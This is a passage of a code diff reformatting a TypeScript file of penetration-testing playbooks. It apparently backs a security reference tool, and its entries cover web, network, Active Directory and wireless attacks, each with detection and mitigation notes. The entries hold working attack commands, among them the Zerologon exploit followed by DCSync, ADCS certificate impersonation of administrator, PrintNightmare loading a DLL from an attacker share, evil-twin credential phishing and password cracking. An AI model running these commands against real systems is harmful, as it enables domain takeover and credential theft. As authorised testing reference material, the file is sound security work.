-      { title: "Dump the schema", detail: "", commands: [{ code: "inql -t https://target.tld/graphql", note: "" }] },
-      { title: "Test batched queries", detail: "", commands: [{ code: "# POST an array of 100 queries in one request → cost limit?", note: "Batching turns rate limits into meaningless controls." }] },
+      {
+        title: "Check for introspection",
+        detail: "",
+        commands: [{ code: "graphql-cop -t https://target.tld/graphql", note: "" }],
+      },
+      {
+        title: "Dump the schema",
+        detail: "",
+        commands: [{ code: "inql -t https://target.tld/graphql", note: "" }],
+      },
+      {
+        title: "Test batched queries",
+        detail: "",
+        commands: [
+          {
+            code: "# POST an array of 100 queries in one request → cost limit?",
+            note: "Batching turns rate limits into meaningless controls.",
+          },
+        ],
+      },
     ],
     errors: [
-      { message: "introspection disabled in prod", cause: "Correct baseline configuration.", fix: "Enumerate operations from JS bundles / mobile app instead." },
+      {
+        message: "introspection disabled in prod",
+        cause: "Correct baseline configuration.",
+        fix: "Enumerate operations from JS bundles / mobile app instead.",
+      },
     ],
-    detection: "Anomalous __schema queries, batched arrays with high cardinality, alias-based enumeration.",
-    mitigation: "Disable introspection in production, enforce query depth/complexity limits, apply per-field authorization, disable batching.",
+    detection:
+      "Anomalous __schema queries, batched arrays with high cardinality, alias-based enumeration.",
+    mitigation:
+      "Disable introspection in production, enforce query depth/complexity limits, apply per-field authorization, disable batching.",
   },
   {
     slug: "jwt-flaws",
@@ -284,20 +654,43 @@ export const EXTRA_PLAYBOOKS: Playbook[] = [
     category: "Web",
     severity: "high",
     cve: ["CWE-327"],
-    summary: "Common JWT flaws: alg=none acceptance, weak HMAC secrets crackable offline, kid parameter path traversal or SQL injection.",
+    summary:
+      "Common JWT flaws: alg=none acceptance, weak HMAC secrets crackable offline, kid parameter path traversal or SQL injection.",
     prerequisites: ["A JWT issued to your own test account"],
     toolSlugs: ["jwt_tool"],
     legalNote: LEGAL,
     steps: [
-      { title: "Try alg=none", detail: "", commands: [{ code: "jwt_tool <TOKEN> -X a", note: "" }] },
-      { title: "Crack weak HMAC", detail: "", commands: [{ code: "jwt_tool <TOKEN> -C -d /usr/share/wordlists/rockyou.txt", note: "" }] },
-      { title: "kid injection", detail: "", commands: [{ code: "jwt_tool <TOKEN> -I -pc kid -pv '../../../../dev/null'", note: "Empty file → NULL byte HMAC key." }] },
+      {
+        title: "Try alg=none",
+        detail: "",
+        commands: [{ code: "jwt_tool <TOKEN> -X a", note: "" }],
+      },
+      {
+        title: "Crack weak HMAC",
+        detail: "",
+        commands: [{ code: "jwt_tool <TOKEN> -C -d /usr/share/wordlists/rockyou.txt", note: "" }],
+      },
+      {
+        title: "kid injection",
+        detail: "",
+        commands: [
+          {
+            code: "jwt_tool <TOKEN> -I -pc kid -pv '../../../../dev/null'",
+            note: "Empty file → NULL byte HMAC key.",
+          },
+        ],
+      },
     ],
     errors: [
-      { message: "server rejects modified token", cause: "Signature validated correctly.", fix: "Note as a positive control; test kid/algorithm confusion separately." },
+      {
+        message: "server rejects modified token",
+        cause: "Signature validated correctly.",
+        fix: "Note as a positive control; test kid/algorithm confusion separately.",
+      },
     ],
     detection: "Auth logs for tokens with alg=none, unusual kid values, or issuer mismatch.",
-    mitigation: "Reject alg=none, use asymmetric keys with a fixed algorithm on the server, ignore kid claim from token when selecting the key.",
+    mitigation:
+      "Reject alg=none, use asymmetric keys with a fixed algorithm on the server, ignore kid claim from token when selecting the key.",
   },
   {
     slug: "race-condition",
@@ -305,35 +698,79 @@ export const EXTRA_PLAYBOOKS: Playbook[] = [
     category: "Web",
     severity: "high",
     cve: ["CWE-362"],
-    summary: "Exploit TOCTOU windows in checkout, gift cards, redemption, MFA verification, and file operations.",
+    summary:
+      "Exploit TOCTOU windows in checkout, gift cards, redemption, MFA verification, and file operations.",
     prerequisites: ["A single-request action that should be idempotent"],
     toolSlugs: ["burpsuite", "turbo-intruder"],
     legalNote: LEGAL,
     steps: [
-      { title: "Identify candidate endpoints", detail: "One-per-account redemptions, MFA verify, refunds, gift-card balance.", commands: [{ code: "# Filter Burp history for state-changing POSTs with unique tokens", note: "" }] },
-      { title: "Run single-packet attack", detail: "", commands: [{ code: "# Burp Repeater → 'Send group in parallel (single-packet)'", note: "20-30 identical requests in one TCP packet." }] },
+      {
+        title: "Identify candidate endpoints",
+        detail: "One-per-account redemptions, MFA verify, refunds, gift-card balance.",
+        commands: [
+          { code: "# Filter Burp history for state-changing POSTs with unique tokens", note: "" },
+        ],
+      },
+      {
+        title: "Run single-packet attack",
+        detail: "",
+        commands: [
+          {
+            code: "# Burp Repeater → 'Send group in parallel (single-packet)'",
+            note: "20-30 identical requests in one TCP packet.",
+          },
+        ],
+      },
     ],
     errors: [
-      { message: "requests strictly serialised", cause: "Server locks correctly.", fix: "Not exploitable; try adjacent workflows." },
+      {
+        message: "requests strictly serialised",
+        cause: "Server locks correctly.",
+        fix: "Not exploitable; try adjacent workflows.",
+      },
     ],
     detection: "Duplicate row inserts in fraud dashboards, unusual timing patterns.",
-    mitigation: "Use database uniqueness constraints and transactions with SELECT ... FOR UPDATE; per-user distributed locks; idempotency keys.",
+    mitigation:
+      "Use database uniqueness constraints and transactions with SELECT ... FOR UPDATE; per-user distributed locks; idempotency keys.",
   },
   {
     slug: "content-discovery",
     title: "Content & endpoint discovery (safe fuzzing)",
     category: "Web",
     severity: "low",
-    summary: "Enumerate directories, files, and API endpoints for an authorised target with throttled, respectful fuzzing.",
+    summary:
+      "Enumerate directories, files, and API endpoints for an authorised target with throttled, respectful fuzzing.",
     prerequisites: ["Authorised web scope", "SecLists installed"],
     toolSlugs: ["ffuf", "gobuster", "feroxbuster", "dirb", "kiterunner"],
     legalNote: LEGAL,
     steps: [
-      { title: "Baseline (small dictionary)", detail: "", commands: [{ code: "ffuf -u https://target.tld/FUZZ -w /usr/share/seclists/Discovery/Web-Content/common.txt -mc 200,301,302,401,403 -t 20 -p 0.1", note: "-p adds jitter." }] },
-      { title: "API-aware discovery", detail: "", commands: [{ code: "kr scan https://target.tld -w /usr/share/kiterunner/routes-large.kite", note: "Reads a route dictionary (Swagger-based)." }] },
+      {
+        title: "Baseline (small dictionary)",
+        detail: "",
+        commands: [
+          {
+            code: "ffuf -u https://target.tld/FUZZ -w /usr/share/seclists/Discovery/Web-Content/common.txt -mc 200,301,302,401,403 -t 20 -p 0.1",
+            note: "-p adds jitter.",
+          },
+        ],
+      },
+      {
+        title: "API-aware discovery",
+        detail: "",
+        commands: [
+          {
+            code: "kr scan https://target.tld -w /usr/share/kiterunner/routes-large.kite",
+            note: "Reads a route dictionary (Swagger-based).",
+          },
+        ],
+      },
     ],
     errors: [
-      { message: "429 Too Many Requests", cause: "You are being rate-limited.", fix: "Lower -t and add -p delay; check ROE for allowed rate." },
+      {
+        message: "429 Too Many Requests",
+        cause: "You are being rate-limited.",
+        fix: "Lower -t and add -p delay; check ROE for allowed rate.",
+      },
     ],
     detection: "Sudden 404 spikes and WAF log entries from a single IP.",
     mitigation: "Rate-limit at the edge; monitor 404 distributions.",
@@ -343,18 +780,33 @@ export const EXTRA_PLAYBOOKS: Playbook[] = [
     title: "WordPress security audit",
     category: "Web",
     severity: "medium",
-    summary: "Audit an authorised WordPress site: version, users, plugins, themes, and known-vulnerable components.",
+    summary:
+      "Audit an authorised WordPress site: version, users, plugins, themes, and known-vulnerable components.",
     prerequisites: ["Authorised WordPress target", "Optional: wpscan API token"],
     toolSlugs: ["wpscan", "cmsmap"],
     legalNote: LEGAL,
     steps: [
-      { title: "Version + vulnerable plugins", detail: "", commands: [{ code: "wpscan --url https://target.tld -e vp,vt,u --api-token <TOKEN>", note: "vp=vuln plugins, vt=themes, u=users." }] },
+      {
+        title: "Version + vulnerable plugins",
+        detail: "",
+        commands: [
+          {
+            code: "wpscan --url https://target.tld -e vp,vt,u --api-token <TOKEN>",
+            note: "vp=vuln plugins, vt=themes, u=users.",
+          },
+        ],
+      },
     ],
     errors: [
-      { message: "403 from the site", cause: "WAF blocking wpscan UA.", fix: "--random-user-agent or throttle." },
+      {
+        message: "403 from the site",
+        cause: "WAF blocking wpscan UA.",
+        fix: "--random-user-agent or throttle.",
+      },
     ],
     detection: "wpscan UA in access logs, /wp-json/wp/v2/users enumeration.",
-    mitigation: "Keep core+plugins current, remove unused plugins, restrict xmlrpc.php, hide user enumeration.",
+    mitigation:
+      "Keep core+plugins current, remove unused plugins, restrict xmlrpc.php, hide user enumeration.",
   },
 
   // ─────────────── Network ───────────────
@@ -363,21 +815,60 @@ export const EXTRA_PLAYBOOKS: Playbook[] = [
     title: "Port scanning & service enumeration methodology",
     category: "Network",
     severity: "low",
-    summary: "Structured methodology for asset discovery, port enumeration, service fingerprinting, and safe CVE mapping.",
+    summary:
+      "Structured methodology for asset discovery, port enumeration, service fingerprinting, and safe CVE mapping.",
     prerequisites: ["Authorised network scope", "nmap installed"],
     toolSlugs: ["nmap", "masscan", "rustscan", "naabu"],
     legalNote: LEGAL,
     steps: [
-      { title: "Host discovery", detail: "", commands: [{ code: "nmap -sn 10.0.0.0/24 -oA hosts", note: "ARP+ICMP on local, ICMP+ACK on remote." }] },
-      { title: "Fast port sweep", detail: "", commands: [{ code: "masscan -p1-65535 --rate 5000 -iL live.txt -oL ports.masscan", note: "Then feed to nmap for -sV." }] },
-      { title: "Service/version detection", detail: "", commands: [{ code: "nmap -sS -sV -sC -O -T4 -p- --min-rate 1000 -iL live.txt -oA full", note: "" }] },
-      { title: "Safe vulnerability mapping", detail: "", commands: [{ code: "nmap --script 'vuln and safe' -p <ports> -iL live.txt -oA vuln", note: "Use safe scripts only against production." }] },
+      {
+        title: "Host discovery",
+        detail: "",
+        commands: [
+          {
+            code: "nmap -sn 10.0.0.0/24 -oA hosts",
+            note: "ARP+ICMP on local, ICMP+ACK on remote.",
+          },
+        ],
+      },
+      {
+        title: "Fast port sweep",
+        detail: "",
+        commands: [
+          {
+            code: "masscan -p1-65535 --rate 5000 -iL live.txt -oL ports.masscan",
+            note: "Then feed to nmap for -sV.",
+          },
+        ],
+      },
+      {
+        title: "Service/version detection",
+        detail: "",
+        commands: [
+          { code: "nmap -sS -sV -sC -O -T4 -p- --min-rate 1000 -iL live.txt -oA full", note: "" },
+        ],
+      },
+      {
+        title: "Safe vulnerability mapping",
+        detail: "",
+        commands: [
+          {
+            code: "nmap --script 'vuln and safe' -p <ports> -iL live.txt -oA vuln",
+            note: "Use safe scripts only against production.",
+          },
+        ],
+      },
     ],
     errors: [
-      { message: "'nmap requires root privileges'", cause: "-sS/-O need raw sockets.", fix: "Run with sudo or use setcap." },
+      {
+        message: "'nmap requires root privileges'",
+        cause: "-sS/-O need raw sockets.",
+        fix: "Run with sudo or use setcap.",
+      },
     ],
     detection: "SIEM signatures for scan patterns, IDS alerts on nmap NSE fingerprints.",
-    mitigation: "Firewall tightening, host-based FW, unused service disablement, anomaly-based IDS.",
+    mitigation:
+      "Firewall tightening, host-based FW, unused service disablement, anomaly-based IDS.",
   },
   {
     slug: "smb-enum",
@@ -389,12 +880,33 @@ export const EXTRA_PLAYBOOKS: Playbook[] = [
     toolSlugs: ["enum4linux", "smbmap", "smbclient", "rpcclient", "cme-alias"],
     legalNote: LEGAL,
     steps: [
-      { title: "Broad enum", detail: "", commands: [{ code: "enum4linux -a 10.0.0.5", note: "Users/shares/groups/policy." }] },
-      { title: "Share listing", detail: "", commands: [{ code: "smbmap -H 10.0.0.5", note: "" }, { code: "nxc smb 10.0.0.0/24 --shares", note: "" }] },
-      { title: "Null-session RPC", detail: "", commands: [{ code: "rpcclient -U '' -N 10.0.0.5", note: "Try enumdomusers, querydominfo." }] },
+      {
+        title: "Broad enum",
+        detail: "",
+        commands: [{ code: "enum4linux -a 10.0.0.5", note: "Users/shares/groups/policy." }],
+      },
+      {
+        title: "Share listing",
+        detail: "",
+        commands: [
+          { code: "smbmap -H 10.0.0.5", note: "" },
+          { code: "nxc smb 10.0.0.0/24 --shares", note: "" },
+        ],
+      },
+      {
+        title: "Null-session RPC",
+        detail: "",
+        commands: [
+          { code: "rpcclient -U '' -N 10.0.0.5", note: "Try enumdomusers, querydominfo." },
+        ],
+      },
     ],
     errors: [
-      { message: "STATUS_ACCESS_DENIED", cause: "Signing / auth required.", fix: "Try guest, or authenticated with a valid domain user." },
+      {
+        message: "STATUS_ACCESS_DENIED",
+        cause: "Signing / auth required.",
+        fix: "Try guest, or authenticated with a valid domain user.",
+      },
     ],
     detection: "Event 5140/5145 spikes, enum4linux UA in Samba logs.",
     mitigation: "Require SMB signing, disable SMBv1, restrict null sessions, RestrictAnonymous=2.",
@@ -406,17 +918,50 @@ export const EXTRA_PLAYBOOKS: Playbook[] = [
     severity: "critical",
     cve: ["CVE-2020-1472"],
     mitreAttack: ["T1210"],
-    summary: "Authentication bypass in Netlogon lets an attacker set the DC computer account password to empty, then DCSync.",
+    summary:
+      "Authentication bypass in Netlogon lets an attacker set the DC computer account password to empty, then DCSync.",
     prerequisites: ["Network reachability to a Domain Controller (TCP/135, 445, dynamic RPC)"],
     toolSlugs: ["impacket", "nmap"],
     legalNote: LEGAL,
     steps: [
-      { title: "Detect (safe check)", detail: "", commands: [{ code: "python3 zerologon_tester.py DC01 10.0.0.10", note: "Non-destructive check." }] },
-      { title: "Exploit (destructive — only in a lab or explicitly authorised)", detail: "", commands: [{ code: "python3 cve-2020-1472-exploit.py DC01 10.0.0.10", note: "Sets DC$ password to empty." }, { code: "impacket-secretsdump -no-pass -just-dc DOMAIN/DC01\\$@10.0.0.10", note: "DCSync with empty password." }] },
-      { title: "Restore DC$ password", detail: "Failure to restore leaves the DC broken and out of the domain.", commands: [{ code: "python3 restorepassword.py DOMAIN/DC01@10.0.0.10 -target-ip 10.0.0.10 -hexpass <ORIGINAL>", note: "Recover original hash." }] },
+      {
+        title: "Detect (safe check)",
+        detail: "",
+        commands: [
+          { code: "python3 zerologon_tester.py DC01 10.0.0.10", note: "Non-destructive check." },
+        ],
+      },
+      {
+        title: "Exploit (destructive — only in a lab or explicitly authorised)",
+        detail: "",
+        commands: [
+          {
+            code: "python3 cve-2020-1472-exploit.py DC01 10.0.0.10",
+            note: "Sets DC$ password to empty.",
+          },
+          {
+            code: "impacket-secretsdump -no-pass -just-dc DOMAIN/DC01\\$@10.0.0.10",
+            note: "DCSync with empty password.",
+          },
+        ],
+      },
+      {
+        title: "Restore DC$ password",
+        detail: "Failure to restore leaves the DC broken and out of the domain.",
+        commands: [
+          {
+            code: "python3 restorepassword.py DOMAIN/DC01@10.0.0.10 -target-ip 10.0.0.10 -hexpass <ORIGINAL>",
+            note: "Recover original hash.",
+          },
+        ],
+      },
     ],
     errors: [
-      { message: "test succeeds but not vulnerable", cause: "Patched (KB4577668 or later).", fix: "None needed — report positive detection." },
+      {
+        message: "test succeeds but not vulnerable",
+        cause: "Patched (KB4577668 or later).",
+        fix: "None needed — report positive detection.",
+      },
     ],
     detection: "Event 4742 for the DC computer account changing, Netlogon secure-channel resets.",
     mitigation: "Install August 2020 (or later) patches, enforce Netlogon secure RPC.",
@@ -433,10 +978,23 @@ export const EXTRA_PLAYBOOKS: Playbook[] = [
     toolSlugs: ["impacket", "metasploit"],
     legalNote: LEGAL,
     steps: [
-      { title: "Detect", detail: "", commands: [{ code: "python3 CVE-2021-1675.py DOMAIN/user:'Pw'@10.0.0.5 '\\\\\\\\<attacker>\\\\share\\\\dll.dll'", note: "" }] },
+      {
+        title: "Detect",
+        detail: "",
+        commands: [
+          {
+            code: "python3 CVE-2021-1675.py DOMAIN/user:'Pw'@10.0.0.5 '\\\\\\\\<attacker>\\\\share\\\\dll.dll'",
+            note: "",
+          },
+        ],
+      },
     ],
     errors: [
-      { message: "not vulnerable", cause: "Patched and PointAndPrint restrictions enforced.", fix: "Confirm KB installed." },
+      {
+        message: "not vulnerable",
+        cause: "Patched and PointAndPrint restrictions enforced.",
+        fix: "Confirm KB installed.",
+      },
     ],
     detection: "New driver installation events (event 316), Spooler restart events.",
     mitigation: "Patch, disable Print Spooler on DCs, enforce PackagePointAndPrintOnly.",
@@ -447,15 +1005,29 @@ export const EXTRA_PLAYBOOKS: Playbook[] = [
     category: "Network",
     severity: "high",
     mitreAttack: ["T1557.002"],
-    summary: "Poison ARP tables so traffic between two hosts flows through your machine — used to demonstrate lack of segmentation and enforce move to switch security.",
+    summary:
+      "Poison ARP tables so traffic between two hosts flows through your machine — used to demonstrate lack of segmentation and enforce move to switch security.",
     prerequisites: ["On the same broadcast domain as target hosts", "Authorised segment"],
     toolSlugs: ["bettercap", "ettercap", "dsniff"],
     legalNote: LEGAL,
     steps: [
-      { title: "Bettercap", detail: "", commands: [{ code: "sudo bettercap -iface eth0 -eval 'set arp.spoof.targets 10.0.0.5; arp.spoof on; net.sniff on'", note: "" }] },
+      {
+        title: "Bettercap",
+        detail: "",
+        commands: [
+          {
+            code: "sudo bettercap -iface eth0 -eval 'set arp.spoof.targets 10.0.0.5; arp.spoof on; net.sniff on'",
+            note: "",
+          },
+        ],
+      },
     ],
     errors: [
-      { message: "victims still talk directly", cause: "Dynamic ARP inspection or static ARP.", fix: "Report the working mitigation." },
+      {
+        message: "victims still talk directly",
+        cause: "Dynamic ARP inspection or static ARP.",
+        fix: "Report the working mitigation.",
+      },
     ],
     detection: "Multiple MAC → single IP transitions in the switch table.",
     mitigation: "Dynamic ARP inspection (DAI), DHCP snooping, port security, 802.1X.",
@@ -468,17 +1040,44 @@ export const EXTRA_PLAYBOOKS: Playbook[] = [
     category: "Active Directory",
     severity: "high",
     mitreAttack: ["T1558.004"],
-    summary: "Accounts with 'Do not require Kerberos pre-authentication' issue AS-REP responses to any requester — an offline-crackable ticket.",
-    prerequisites: ["Line-of-sight to a DC on 88/tcp", "A list of possible usernames (kerbrute or LDAP)"],
+    summary:
+      "Accounts with 'Do not require Kerberos pre-authentication' issue AS-REP responses to any requester — an offline-crackable ticket.",
+    prerequisites: [
+      "Line-of-sight to a DC on 88/tcp",
+      "A list of possible usernames (kerbrute or LDAP)",
+    ],
     toolSlugs: ["impacket", "kerbrute", "hashcat"],
     legalNote: LEGAL,
     steps: [
-      { title: "Enumerate usernames", detail: "", commands: [{ code: "kerbrute userenum -d corp.local --dc 10.0.0.10 users.txt", note: "" }] },
-      { title: "Request AS-REP", detail: "", commands: [{ code: "impacket-GetNPUsers corp.local/ -dc-ip 10.0.0.10 -usersfile users.txt -format hashcat -outputfile asrep.hash -no-pass", note: "" }] },
-      { title: "Crack", detail: "", commands: [{ code: "hashcat -m 18200 asrep.hash /usr/share/wordlists/rockyou.txt", note: "" }] },
+      {
+        title: "Enumerate usernames",
+        detail: "",
+        commands: [{ code: "kerbrute userenum -d corp.local --dc 10.0.0.10 users.txt", note: "" }],
+      },
+      {
+        title: "Request AS-REP",
+        detail: "",
+        commands: [
+          {
+            code: "impacket-GetNPUsers corp.local/ -dc-ip 10.0.0.10 -usersfile users.txt -format hashcat -outputfile asrep.hash -no-pass",
+            note: "",
+          },
+        ],
+      },
+      {
+        title: "Crack",
+        detail: "",
+        commands: [
+          { code: "hashcat -m 18200 asrep.hash /usr/share/wordlists/rockyou.txt", note: "" },
+        ],
+      },
     ],
     errors: [
-      { message: "KRB5KDC_ERR_PREAUTH_REQUIRED for every user", cause: "No accounts opted out of pre-auth.", fix: "Confirm as a positive finding; nothing to roast." },
+      {
+        message: "KRB5KDC_ERR_PREAUTH_REQUIRED for every user",
+        cause: "No accounts opted out of pre-auth.",
+        fix: "Confirm as a positive finding; nothing to roast.",
+      },
     ],
     detection: "Event 4768 with pre-auth-not-required requests from unusual sources.",
     mitigation: "Do not disable Kerberos pre-authentication; audit any account that has.",
@@ -490,37 +1089,95 @@ export const EXTRA_PLAYBOOKS: Playbook[] = [
     severity: "critical",
     cve: ["CWE-284"],
     mitreAttack: ["T1649"],
-    summary: "Vulnerable certificate template allows Enrollee to Supply Subject → request a cert as any user, including Domain Admin.",
+    summary:
+      "Vulnerable certificate template allows Enrollee to Supply Subject → request a cert as any user, including Domain Admin.",
     prerequisites: ["Low-priv AD user", "Certipy installed"],
     toolSlugs: ["adcs-certipy", "impacket"],
     legalNote: LEGAL,
     steps: [
-      { title: "Enumerate templates", detail: "", commands: [{ code: "certipy find -u alice@corp.local -p Pw -dc-ip 10.0.0.10 -stdout | tee ca.txt", note: "Look for ESC1-ESC15 flags." }] },
-      { title: "Request cert as Admin", detail: "", commands: [{ code: "certipy req -u alice@corp.local -p Pw -ca corp-CA -template VulnUserCert -upn administrator@corp.local -dc-ip 10.0.0.10", note: "" }] },
-      { title: "Authenticate as Admin", detail: "", commands: [{ code: "certipy auth -pfx administrator.pfx -dc-ip 10.0.0.10", note: "Yields NTLM hash / TGT." }] },
+      {
+        title: "Enumerate templates",
+        detail: "",
+        commands: [
+          {
+            code: "certipy find -u alice@corp.local -p Pw -dc-ip 10.0.0.10 -stdout | tee ca.txt",
+            note: "Look for ESC1-ESC15 flags.",
+          },
+        ],
+      },
+      {
+        title: "Request cert as Admin",
+        detail: "",
+        commands: [
+          {
+            code: "certipy req -u alice@corp.local -p Pw -ca corp-CA -template VulnUserCert -upn administrator@corp.local -dc-ip 10.0.0.10",
+            note: "",
+          },
+        ],
+      },
+      {
+        title: "Authenticate as Admin",
+        detail: "",
+        commands: [
+          {
+            code: "certipy auth -pfx administrator.pfx -dc-ip 10.0.0.10",
+            note: "Yields NTLM hash / TGT.",
+          },
+        ],
+      },
     ],
     errors: [
-      { message: "no vulnerable templates", cause: "Templates hardened correctly.", fix: "Report positive finding on the audit." },
+      {
+        message: "no vulnerable templates",
+        cause: "Templates hardened correctly.",
+        fix: "Report positive finding on the audit.",
+      },
     ],
-    detection: "Event 4886/4887 (certificate request/issued) for templates that allow Enrollee to Supply Subject.",
-    mitigation: "Remove 'Enrollee supplies subject' from templates, require manager approval, restrict CA enrollment.",
+    detection:
+      "Event 4886/4887 (certificate request/issued) for templates that allow Enrollee to Supply Subject.",
+    mitigation:
+      "Remove 'Enrollee supplies subject' from templates, require manager approval, restrict CA enrollment.",
   },
   {
     slug: "bloodhound-mapping",
     title: "BloodHound: mapping AD attack paths",
     category: "Active Directory",
     severity: "medium",
-    summary: "Collect AD ACL/session data with SharpHound or BloodHound.py, then graph shortest paths to Domain Admin.",
+    summary:
+      "Collect AD ACL/session data with SharpHound or BloodHound.py, then graph shortest paths to Domain Admin.",
     prerequisites: ["Any valid domain account", "Neo4j running locally"],
     toolSlugs: ["bloodhound", "sharphound", "bloodhound-py"],
     legalNote: LEGAL,
     steps: [
-      { title: "Collect", detail: "", commands: [{ code: "bloodhound-python -c All -u alice -p Pw -d corp.local -ns 10.0.0.10", note: "" }] },
-      { title: "Load into BloodHound", detail: "", commands: [{ code: "bloodhound", note: "Drag JSON files into the UI." }] },
-      { title: "Run queries", detail: "", commands: [{ code: "# Prebuilt: Shortest Paths to Domain Admins, Kerberoastable Users, Users with DCSync", note: "" }] },
+      {
+        title: "Collect",
+        detail: "",
+        commands: [
+          { code: "bloodhound-python -c All -u alice -p Pw -d corp.local -ns 10.0.0.10", note: "" },
+        ],
+      },
+      {
+        title: "Load into BloodHound",
+        detail: "",
+        commands: [{ code: "bloodhound", note: "Drag JSON files into the UI." }],
+      },
+      {
+        title: "Run queries",
+        detail: "",
+        commands: [
+          {
+            code: "# Prebuilt: Shortest Paths to Domain Admins, Kerberoastable Users, Users with DCSync",
+            note: "",
+          },
+        ],
+      },
     ],
     errors: [
-      { message: "Neo4j auth error", cause: "Default password not changed after first login.", fix: "Set on first login via web UI at localhost:7474." },
+      {
+        message: "Neo4j auth error",
+        cause: "Default password not changed after first login.",
+        fix: "Set on first login via web UI at localhost:7474.",
+      },
     ],
     detection: "Bulk LDAP queries from a workstation, unusual SAMR calls.",
     mitigation: "Reduce ACL sprawl, audit DA members, tier admin accounts, apply LAPS + gMSA.",
@@ -533,17 +1190,41 @@ export const EXTRA_PLAYBOOKS: Playbook[] = [
     category: "Wireless",
     severity: "high",
     mitreAttack: ["T1040"],
-    summary: "Some APs leak the PMKID in the first message of the 4-way handshake, enabling an offline dictionary attack without waiting for a client.",
+    summary:
+      "Some APs leak the PMKID in the first message of the 4-way handshake, enabling an offline dictionary attack without waiting for a client.",
     prerequisites: ["Monitor-mode-capable adapter", "Authorised SSID"],
     toolSlugs: ["hcxdumptool", "hcxtools", "hashcat"],
     legalNote: LEGAL,
     steps: [
-      { title: "Capture", detail: "", commands: [{ code: "sudo hcxdumptool -i wlan0mon -o dump.pcapng --active_beacon --enable_status=15", note: "" }] },
-      { title: "Convert", detail: "", commands: [{ code: "hcxpcapngtool -o hash.22000 dump.pcapng", note: "" }] },
-      { title: "Crack", detail: "", commands: [{ code: "hashcat -m 22000 hash.22000 /usr/share/wordlists/rockyou.txt", note: "" }] },
+      {
+        title: "Capture",
+        detail: "",
+        commands: [
+          {
+            code: "sudo hcxdumptool -i wlan0mon -o dump.pcapng --active_beacon --enable_status=15",
+            note: "",
+          },
+        ],
+      },
+      {
+        title: "Convert",
+        detail: "",
+        commands: [{ code: "hcxpcapngtool -o hash.22000 dump.pcapng", note: "" }],
+      },
+      {
+        title: "Crack",
+        detail: "",
+        commands: [
+          { code: "hashcat -m 22000 hash.22000 /usr/share/wordlists/rockyou.txt", note: "" },
+        ],
+      },
     ],
     errors: [
-      { message: "0 hashes written", cause: "AP not leaking PMKID.", fix: "Fall back to handshake capture (playbook: wpa2-handshake)." },
+      {
+        message: "0 hashes written",
+        cause: "AP not leaking PMKID.",
+        fix: "Fall back to handshake capture (playbook: wpa2-handshake).",
+      },
     ],
     detection: "Frequent probe-response bursts, WIDS detection of hcxdumptool signatures.",
     mitigation: "WPA3-SAE, disable PMKID caching where possible, 20+ char PSKs.",
@@ -554,16 +1235,34 @@ export const EXTRA_PLAYBOOKS: Playbook[] = [
     category: "Wireless",
     severity: "high",
     mitreAttack: ["T1078"],
-    summary: "Offline attack on WPS PIN when the AP uses weak randomness in the E-S1/E-S2 nonces — recovers PIN in seconds.",
+    summary:
+      "Offline attack on WPS PIN when the AP uses weak randomness in the E-S1/E-S2 nonces — recovers PIN in seconds.",
     prerequisites: ["Monitor-mode adapter", "AP with WPS enabled + vulnerable"],
     toolSlugs: ["reaver", "bully", "pixiewps", "wifite"],
     legalNote: LEGAL,
     steps: [
-      { title: "Enumerate WPS", detail: "", commands: [{ code: "sudo wash -i wlan0mon", note: "Lists WPS-enabled APs." }] },
-      { title: "Reaver + Pixie Dust", detail: "", commands: [{ code: "sudo reaver -i wlan0mon -b <BSSID> -c <CH> -K 1 -N -vv", note: "-K 1 = pixiedust." }] },
+      {
+        title: "Enumerate WPS",
+        detail: "",
+        commands: [{ code: "sudo wash -i wlan0mon", note: "Lists WPS-enabled APs." }],
+      },
+      {
+        title: "Reaver + Pixie Dust",
+        detail: "",
+        commands: [
+          {
+            code: "sudo reaver -i wlan0mon -b <BSSID> -c <CH> -K 1 -N -vv",
+            note: "-K 1 = pixiedust.",
+          },
+        ],
+      },
     ],
     errors: [
-      { message: "WPS transaction failed", cause: "AP lockout after failed attempts.", fix: "Wait or reboot AP; some newer firmware never unlocks." },
+      {
+        message: "WPS transaction failed",
+        cause: "AP lockout after failed attempts.",
+        fix: "Wait or reboot AP; some newer firmware never unlocks.",
+      },
     ],
     detection: "WPS transaction spam in AP logs.",
     mitigation: "Disable WPS entirely on production APs.",
@@ -573,34 +1272,63 @@ export const EXTRA_PLAYBOOKS: Playbook[] = [
     title: "Evil-twin / rogue AP (authorised phishing)",
     category: "Wireless",
     severity: "high",
-    summary: "Stand up a rogue AP with the same SSID as the target, present a captive portal, and capture credentials — only under explicit scope.",
-    prerequisites: ["Two wireless adapters (one for AP, one for deauth)", "Authorised physical scope + written phishing approval"],
+    summary:
+      "Stand up a rogue AP with the same SSID as the target, present a captive portal, and capture credentials — only under explicit scope.",
+    prerequisites: [
+      "Two wireless adapters (one for AP, one for deauth)",
+      "Authorised physical scope + written phishing approval",
+    ],
     toolSlugs: ["wifiphisher", "airgeddon", "hostapd-wpe"],
     legalNote: LEGAL,
     steps: [
-      { title: "Launch", detail: "", commands: [{ code: "sudo wifiphisher -aI wlan0 -jI wlan1 -p oauth-login", note: "" }] },
+      {
+        title: "Launch",
+        detail: "",
+        commands: [{ code: "sudo wifiphisher -aI wlan0 -jI wlan1 -p oauth-login", note: "" }],
+      },
     ],
     errors: [
-      { message: "clients don't associate", cause: "Deauth not effective (PMF enabled).", fix: "Report PMF as effective mitigation." },
+      {
+        message: "clients don't associate",
+        cause: "Deauth not effective (PMF enabled).",
+        fix: "Report PMF as effective mitigation.",
+      },
     ],
     detection: "WIDS: duplicate BSSIDs, unusual beacon frames, high deauth volume.",
-    mitigation: "WPA3 with PMF (Protected Management Frames), certificate pinning on internal captive portals, EAP-TLS.",
+    mitigation:
+      "WPA3 with PMF (Protected Management Frames), certificate pinning on internal captive portals, EAP-TLS.",
   },
   {
     slug: "ble-recon",
     title: "Bluetooth Low Energy reconnaissance",
     category: "Wireless",
     severity: "low",
-    summary: "Passive BLE scanning and GATT enumeration against devices you own or in an authorised lab.",
+    summary:
+      "Passive BLE scanning and GATT enumeration against devices you own or in an authorised lab.",
     prerequisites: ["BLE adapter", "Authorised device"],
     toolSlugs: ["bluez-tools", "btscanner"],
     legalNote: LEGAL,
     steps: [
-      { title: "Scan", detail: "", commands: [{ code: "sudo bluetoothctl", note: "Then: scan on; devices;" }, { code: "sudo hcitool lescan", note: "" }] },
-      { title: "Enumerate services", detail: "", commands: [{ code: "gatttool -b <MAC> --primary", note: "" }] },
+      {
+        title: "Scan",
+        detail: "",
+        commands: [
+          { code: "sudo bluetoothctl", note: "Then: scan on; devices;" },
+          { code: "sudo hcitool lescan", note: "" },
+        ],
+      },
+      {
+        title: "Enumerate services",
+        detail: "",
